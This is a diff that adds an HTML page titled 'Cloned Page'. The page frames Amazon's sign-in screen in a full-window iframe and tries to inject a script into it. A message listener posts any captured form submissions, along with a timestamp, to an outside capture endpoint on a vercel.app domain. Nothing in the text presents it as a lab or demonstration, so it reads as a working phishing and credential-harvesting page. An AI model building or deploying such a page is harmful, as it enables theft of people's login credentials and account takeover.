@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cloned Page - https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fs%3Fk%3Damazon%2Blogin%26adgrpid%3D79685717977%26hvadid%3D673484586627%26hvdev%3Dc%26hvlocphy%3D9198752%26hvnetw%3Dg%26hvqmt%3De%26hvrand%3D10233218212970141575%26hvtargid%3Dkwd-360364907677%26hydadcr%3D2745_13713730%26mcid%3Dcb8e2cd257583e76bdf39dcbc2a58a50%26tag%3Dhydglogoo-20%26ref%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0</title>
+    <style>
+        body { 
+            margin: 0; 
+            padding: 0; 
+            height: 100vh; 
+            width: 100vw; 
+            overflow: hidden; 
+        }
+        iframe { 
+            border: none; 
+            width: 100%; 
+            height: 100%; 
+        }
+    </style>
+    <script>
+        // Capture form submissions in iframe
+        window.addEventListener('message', function(e) {
+            if (e.data.type === 'formSubmit') {
+                fetch('https://elynaofficial.vercel.app/api/capture', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        url: 'https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fs%3Fk%3Damazon%2Blogin%26adgrpid%3D79685717977%26hvadid%3D673484586627%26hvdev%3Dc%26hvlocphy%3D9198752%26hvnetw%3Dg%26hvqmt%3De%26hvrand%3D10233218212970141575%26hvtargid%3Dkwd-360364907677%26hydadcr%3D2745_13713730%26mcid%3Dcb8e2cd257583e76bdf39dcbc2a58a50%26tag%3Dhydglogoo-20%26ref%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0',
+                        formData: e.data.data,
+                        timestamp: new Date().toISOString(),
+                        source: 'iframe'
+                    })
+                });
+            }
+        });
+    </script>
+</head>
+<body>
+    <iframe src="https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fs%3Fk%3Damazon%2Blogin%26adgrpid%3D79685717977%26hvadid%3D673484586627%26hvdev%3Dc%26hvlocphy%3D9198752%26hvnetw%3Dg%26hvqmt%3De%26hvrand%3D10233218212970141575%26hvtargid%3Dkwd-360364907677%26hydadcr%3D2745_13713730%26mcid%3Dcb8e2cd257583e76bdf39dcbc2a58a50%26tag%3Dhydglogoo-20%26ref%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0" 
+            sandbox="allow-forms allow-scripts allow-same-origin allow-popups"
+            onload="this.contentWindow.postMessage({type: 'injectScript'}, '*')">
+    </iframe>
+</body>
+</html>
